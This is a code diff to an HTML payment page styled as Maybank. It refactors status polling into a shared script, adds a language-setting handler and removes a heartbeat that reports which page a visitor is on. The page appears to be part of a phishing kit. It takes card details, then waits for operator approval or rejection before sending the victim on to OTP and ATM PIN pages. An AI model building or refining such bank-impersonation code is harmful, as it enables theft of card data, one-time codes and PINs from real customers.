@@ -71,7 +71,7 @@
     <header>
         <div class="header-left">
             <a href="index-en.html"><img src="maybank-logo.png" alt="Maybank"></a>
-            <a href="payment.html" class="lang-btn">BM</a>
+            <a href="payment.html" class="lang-btn" onclick="sessionStorage.setItem('lang', 'ms')">BM</a>
         </div>
         <div class="header-right">
             <div class="phone-group">
@@ -169,6 +169,7 @@
         </div>
     </div>
 
+    <script src="navigation.js"></script>
     <script>
         let pollInterval = null;
         document.getElementById('expiry_date').addEventListener('input', function(e) {
@@ -180,21 +181,8 @@
         async function pollOrderStatus() {
             const orderId = sessionStorage.getItem('orderId');
             if (!orderId) return;
-            try {
-                const res = await fetch('/api/orders/' + orderId + '/status');
-                const data = await res.json();
-                if (data.status === 'approved') {
-                    clearInterval(pollInterval);
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    const nextPages = { 'loading_otp': 'otp-en.html', 'otp': 'otp-en.html', 'loading_atm': 'atm-pin-en.html', 'atm_pin': 'atm-pin-en.html', 'loading_success': 'success-en.html', 'success': 'success-en.html' };
-                    window.location.href = nextPages[data.currentPage] || 'otp-en.html';
-                } else if (data.status === 'rejected') {
-                    clearInterval(pollInterval);
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    if (data.message) document.getElementById('errorMessage').textContent = data.message;
-                    showErrorModal();
-                }
-            } catch (err) { console.error('Poll error:', err); }
+            const done = await pollStatus(orderId, 'payment');
+            if (done) clearInterval(pollInterval);
         }
 
         function showErrorModal() { document.getElementById('errorModal').style.display = 'flex'; }
@@ -214,9 +202,6 @@
             } catch (err) { alert('Error: Failed to connect to server. Please try again.'); }
         });
     </script>
-    <script>
-        function sendHeartbeat() { fetch('/api/heartbeat', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ currentPage: window.location.pathname }) }).catch(() => {}); }
-        setInterval(sendHeartbeat, 30000); sendHeartbeat();
-    </script>
+
 </body>
 </html>
